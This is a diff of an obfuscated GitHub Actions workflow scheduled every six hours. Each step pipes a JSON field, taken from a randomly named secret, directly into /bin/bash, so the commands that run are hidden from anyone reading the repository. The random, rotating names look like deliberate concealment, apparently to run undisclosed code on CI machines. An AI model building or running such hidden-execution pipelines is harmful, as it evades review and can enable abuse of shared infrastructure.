@@ -1,24 +1,28 @@
 name: fawumubiao
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 5/6 * * *'
+    - cron: '7 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: fawumubiao
         env:
-          kbn3361: ${{ secrets.kbn3361 }}
+          t0025: ${{ secrets.t0025 }}
         run: |
-          echo $kbn3361 | jq -r .jhfg26173 | /bin/bash
-          echo $iyc65333 | jq -r .pith0 | /bin/bash
-          echo $p480 | jq -r .zktxo21402 | /bin/bash
-          echo $btzlq4 | jq -r .x74 | /bin/bash
-          echo $cc9467 | jq -r .w6 | /bin/bash
-          echo $du47456 | jq -r .xsq43645 | /bin/bash
-          echo $gvq8215 | jq -r .jlwo93652 | /bin/bash
-          echo $ywaf4 | jq -r .nt715 | /bin/bash
+          echo $t0025 | jq -r .zw6 | /bin/bash
+          echo $qt352 | jq -r .na07195 | /bin/bash
+          echo $gl3096 | jq -r .c34492 | /bin/bash
+          echo $aia57459 | jq -r .uarwh97745 | /bin/bash
+          echo $rks61 | jq -r .mhb65 | /bin/bash
+          echo $vcyhp51 | jq -r .x2696 | /bin/bash
+          echo $o221 | jq -r .zqpo171 | /bin/bash
+          echo $oos9609 | jq -r .kyx96547 | /bin/bash
+          echo $aemd22 | jq -r .hn6 | /bin/bash
+          echo $b9456 | jq -r .yyz3319 | /bin/bash
+          echo $exud5736 | jq -r .vb521 | /bin/bash
 
